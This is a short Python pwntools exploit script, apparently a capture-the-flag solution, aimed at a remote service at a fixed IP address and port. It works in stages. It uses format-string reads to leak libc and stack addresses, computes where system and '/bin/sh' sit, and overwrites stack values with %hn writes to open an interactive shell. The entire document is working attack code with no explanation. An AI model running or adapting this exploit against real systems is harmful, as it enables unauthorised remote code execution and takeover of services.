#                                                                                                                                                                                                                           68,1         모두
from pwn import *

s = remote('139.59.61.220', 32345)

def pmsg(msg):
    s.recvuntil(':')
    s.sendline(msg)

############# STAGE 1 ################
pmsg('2')
pmsg('\x00')
pmsg('%3$p')
libc_base = int(s.recvline()[22:30],16) - 0x1b2000
system_add = libc_base + 0x3ada0
binsh_add = libc_base + 0x15b82b
offset = binsh_add - system_add

print '[+] LIBC : ' + hex(libc_base)
print '[+] SYSTEM : ' + hex(system_add)
print '[+] BINSH OFFSET : ' + hex(offset)

############# STAGE 2 ################
pmsg('2')
pmsg('\x00')
pmsg('%6$p')
stack_leak = int(s.recvline()[22:30],16) + 0x14

print '[+] STACK : ' + hex(stack_leak)


############# STAGE 3 ################
pmsg('2')
pmsg('\x00')

payload = 'AA' + p32(stack_leak+2) + p32(stack_leak)
payload += p32(stack_leak+10) + p32(stack_leak+8)

binsh_f = ((binsh_add) & 0xffff0000)/0x10000
binsh_b = (binsh_add) & 0xffff
binsh_b_off = 0x10000 - (binsh_f)

payload += '%' + str(binsh_f - 18) +'d' + '%13$hn'
payload += '%' + str(binsh_b_off + binsh_b) +'d' + '%14$hn'
pmsg(payload)

s.interactive() # recv all data and send Ctrl+C

############# STAGE 4 ################
# pmsg('2')
s.sendline('2')
pmsg('\x00')

payload = 'AA' + p32(stack_leak+2) + p32(stack_leak)
payload += p32(stack_leak+8) + p32(stack_leak+10)

system_f = ((system_add) & 0xffff0000)/0x10000
system_b = (system_add) & 0xffff
system_b_off = 0x10000 - (system_f)

payload += '%' + str(system_f - 18) +'d' + '%11$hn'
payload += '%' + str(system_b_off + system_b) +'d' + '%12$hn'
pmsg(payload)

############# GET SHELL ################

s.interactive()
